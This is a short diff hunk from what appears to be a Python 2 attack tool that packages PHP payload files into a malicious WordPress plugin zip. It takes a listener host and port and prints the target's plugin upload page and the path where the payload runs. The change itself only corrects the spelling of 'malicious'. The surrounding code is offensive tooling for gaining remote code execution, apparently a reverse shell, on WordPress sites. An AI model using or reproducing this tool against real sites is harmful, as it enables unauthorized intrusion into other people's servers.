@@ -74,13 +74,13 @@ def generate_plugin(LHOST, LPORT, PAYLOAD):
 	payload_file.close()
 	# Create Zip With Payload
 	print "[+] Writing files to zip"
-	make_zip = zipfile.ZipFile('malicous.zip', 'w')
+	make_zip = zipfile.ZipFile('malicious.zip', 'w')
 	make_zip.write('wetw0rk_maybe.php')
 	make_zip.write('QwertyRocks.php')
 	print "[+] Cleaning up files"
 	os.system("rm QwertyRocks.php wetw0rk_maybe.php")
 	# Useful Info
-	print "[+] General Execution Location: http://(target)/wp-content/plugins/malicous/"
+	print "[+] General Execution Location: http://(target)/wp-content/plugins/malicious/"
 	print "[+] General Upload Location: http://(target)/wp-admin/plugin-install.php?tab=upload"
 
 def handler(LHOST, LPORT, PAYLOAD):
